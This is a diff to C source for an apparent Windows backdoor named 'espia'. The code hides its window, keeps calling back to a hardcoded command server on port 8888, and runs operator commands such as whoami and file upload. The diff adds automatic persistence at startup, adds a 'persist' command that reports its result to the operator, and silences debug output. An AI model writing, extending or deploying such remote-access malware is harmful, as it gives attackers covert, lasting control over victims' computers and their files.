@@ -20,9 +20,13 @@ int main() {
 	ShowWindow(stealth, SW_NORMAL);
     /* ------------------------------------------- */
 
+    /* Enable persistance */
+    persist();
+    /* ------------------ */
+
     /* Keep trying to connect to the server */
 	WORD server_status;
-	while ((server_status = espia_connect("172.27.251.12", "8888")) == CONNECTION_FAIL)
+	while ((server_status = espia_connect("172.22.240.46", "8888")) == CONNECTION_FAIL)
 		Sleep(TRY_SERVER);
     /* ------------------------------------ */
 
@@ -41,13 +45,13 @@ int main() {
         /* If connection error occured keep trying to connect to the server */
         if (cmd_size == RECV_FAIL) {
             WORD server_status;
-            while ((server_status = espia_connect("172.27.251.12", "8888")) == CONNECTION_FAIL)
+            while ((server_status = espia_connect("172.22.240.46", "8888")) == CONNECTION_FAIL)
                 Sleep(TRY_SERVER);
         }
         /* ------------------------------------ */
 
         recv_buffw = (PWSTR)recv_buff;
-        printf("Recieved: %ls, size: %d\n", recv_buffw, cmd_size);
+        Debug(printf("Recieved: %ls, size: %d\n", recv_buffw, cmd_size);)
 
         /* Seperate the command from argument using the whitespace (' ') */
         int i = 0;
@@ -60,8 +64,8 @@ int main() {
             cmd_buff[i] = *(recv_buffw + i);
         }
 
-        printf("Command: %ls\n", cmd_buff);
-        printf("Argument: %ls\n", cmd_arg);
+        Debug(printf("Command: %ls\n", cmd_buff);)
+        Debug(printf("Argument: %ls\n", cmd_arg);)
 
         if (wcscmp(cmd_buff, L"whoami") == 0) {
             WCHAR whoami_buff[256 + MAX_COMPUTERNAME_LENGTH + 2];
@@ -84,8 +88,15 @@ int main() {
         } else if (wcscmp(cmd_buff, L"upload") == 0) {
             download_file(cmd_arg , espia_recv, espia_send);
             continue;
-        } else if (wcscmp(cmd_buff, L"persistence") == 0) {
-
+        } else if (wcscmp(cmd_buff, L"persist") == 0) {
+            WCHAR notify[8] = L"\0";
+            if (persist() == 0) {
+                StringCbCatW(notify, sizeof(notify), L"Success");
+                espia_send(notify, wcslen(notify)*sizeof(WCHAR));
+            } else {
+                StringCbCatW(notify, sizeof(notify), L"Failed");
+                espia_send(notify, wcslen(notify)*sizeof(WCHAR));
+            }
         } else {
             espia_send(recv_buffw, cmd_size);
         }
